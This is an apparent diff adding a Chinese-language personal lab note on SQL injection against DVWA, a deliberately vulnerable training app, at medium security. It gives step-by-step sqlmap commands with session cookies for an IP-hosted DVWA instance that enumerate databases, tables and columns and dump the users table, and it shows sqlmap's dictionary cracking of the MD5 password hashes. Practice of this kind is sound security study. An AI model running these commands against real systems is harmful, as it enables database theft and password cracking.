@@ -1,0 +1,62 @@
+{"PHPSESSID=eri0en194dctafg285nraplgu5;security=medium;td_cookie=4170017732"}}
+
+DVWA-SQL-medium
+
+URL：
+http://106.54.82.231/DVWA/vulnerabilities/sqli/?http:%2f%2f106.54.82.231%2fDVWA%2fvulnerabilities%2fsqli%2f
+
+post：
+id=3&Submit=Submit
+
+"PHPSESSID=ub0sdd4gv0615iea6gsv8d4134；security=medium；td_cookie=4193961465"
+
+"td_cookie=4193961465;security=medium;PHPSESSID=ub0sdd4gv0615iea6gsv8d4134"
+
+bp:
+"td_cookie=4194069765; td_cookie=4193961465; security=medium; PHPSESSID=ub0sdd4gv0615iea6gsv8d4134"
+
+成功：
+python2 sqlmap.py -u "http://106.54.82.231/DVWA/vulnerabilities/sqli/?http:%2f%2f106.54.82.231%2fDVWA%2fvulnerabilities%2fsqli%2f" --cookie="td_cookie=4194069765; td_cookie=4193961465; security=medium; PHPSESSID=ub0sdd4gv0615iea6gsv8d4134"  --data="id=3&Submit=Submit"
+
+爆库：
+D:\sqlmap\sqlmap>python2 sqlmap.py -u "http://106.54.82.231/DVWA/vulnerabilities/sqli/?http:%2f%2f106.54.82.231%2fDVWA%2fvulnerabilities%2fsqli%2f" --cookie="td_cookie=4194069765; td_cookie=4193961465; security=medium; PHPSESSID=ub0sdd4gv0615iea6gsv8d4134"  --data="id=3&Submit=Submit" --dbs
+
+爆表：
+python2 sqlmap.py -u "http://106.54.82.231/DVWA/vulnerabilities/sqli/?http:%2f%2f106.54.82.231%2fDVWA%2fvulnerabilities%2fsqli%2f" --cookie="td_cookie=4194069765; td_cookie=4193961465; security=medium; PHPSESSID=ub0sdd4gv0615iea6gsv8d4134"  --data="id=3&Submit=Submit"  --tables  -D“dvwa”
+
+爆字段：
+python2 sqlmap.py -u "http://106.54.82.231/DVWA/vulnerabilities/sqli/?http:%2f%2f106.54.82.231%2fDVWA%2fvulnerabilities%2fsqli%2f" --cookie="td_cookie=4194069765; td_cookie=4193961465; security=medium; PHPSESSID=ub0sdd4gv0615iea6gsv8d4134"  --data="id=3&Submit=Submit"  --columns  -D“dvwa” -T “users”
+
+爆内容：
+python2 sqlmap.py -u "http://106.54.82.231/DVWA/vulnerabilities/sqli/?http:%2f%2f106.54.82.231%2fDVWA%2fvulnerabilities%2fsqli%2f" --cookie="td_cookie=4194069765; td_cookie=4193961465; security=medium; PHPSESSID=ub0sdd4gv0615iea6gsv8d4134"  --data="id=3&Submit=Submit"  --dump  -D“dvwa” -T “users” -C “,user_id,user,password”
+
+回显：
+do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
+是否要将散列存储到临时文件中，以便最终使用其他工具进行进一步处理[y/N]y
+
+do you want to crack them via a dictionary-based attack? [Y/n/q] y
+你想通过基于字典的攻击来破解它们吗？[Y/n/q]y
+
+[1] default dictionary file 'D:\sqlmap\sqlmap\txt\wordlist.zip' (press Enter)
+[2] custom dictionary file
+[3] file with list of dictionary files
+> 1
+
+你想用什么词典？
+[1] 默认字典文件'D:\ sqlmap\sqlmap\txt\wordlist.zip'（按回车键）
+[2] 自定义词典文件
+[3] 包含字典文件列表的文件
+
+do you want to use common password suffixes? (slow!) [y/N] n
+是否要使用常用密码后缀？（慢！）[是/否] 
+
+数据库的密码使用MD5加密的弱口令，这里直接哈希撞出结果了，一步到位
+----------------------------------------------------------------------------------------------------------------
+
+尝试：
+python2 sqlmap.py -u "http://106.54.82.231/DVWA/vulnerabilities/sqli/?http:%2f%2f106.54.82.231%2fDVWA%2fvulnerabilities%2fsqli%2f" --cookie="PHPSESSID=ub0sdd4gv0615iea6gsv8d4134；security=medium；td_cookie=4193961465"  --data="id=3&Submit=Submit"  --dump  -D“dvwa” -T “users” -C “,user_id,user,password”
+成功 但是302  ？？？
+
+python2 sqlmap.py -u "http://106.54.82.231/DVWA/vulnerabilities/sqli/?http:%2f%2f106.54.82.231%2fDVWA%2fvulnerabilities%2fsqli%2f" --cookie="td_cookie=4193961465;security=medium;PHPSESSID=ub0sdd4gv0615iea6gsv8d4134"  --data="id=3&Submit=Submit"  --dump  -D“dvwa” -T “users” -C “,user_id,user,password”
+成功 
+
